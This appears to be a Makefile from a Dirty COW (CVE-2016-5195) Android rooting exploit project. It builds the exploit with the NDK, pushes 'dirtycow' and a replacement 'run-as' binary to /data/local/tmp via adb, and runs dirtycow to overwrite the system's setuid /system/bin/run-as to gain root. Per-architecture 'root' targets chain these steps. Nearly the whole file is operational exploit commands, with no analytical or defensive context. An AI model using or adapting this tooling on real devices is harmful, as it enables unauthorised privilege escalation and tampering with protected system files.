
all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_PLATFORM=android-21

push: build
	adb push libs/armeabi/dirtycow /data/local/tmp/dirtycow
	adb push libs/armeabi/run-as /data/local/tmp/run-as

push-arm7: build
	adb push libs/armeabi-v7a/dirtycow /data/local/tmp/dirtycow
	adb push libs/armeabi-v7a/run-as /data/local/tmp/run-as

push-arm8: build
	adb push libs/arm64-v8a/dirtycow /data/local/tmp/dirtycow
	adb push libs/arm64-v8a/run-as /data/local/tmp/run-as

run:
	adb shell 'chmod 777 /data/local/tmp/run-as'
	adb shell '/data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as'
	adb shell /system/bin/run-as	

root: push run
root-arm7: push-arm7 run
root-arm8: push-arm8 run

clean:
	rm -rf libs
	rm -rf obj

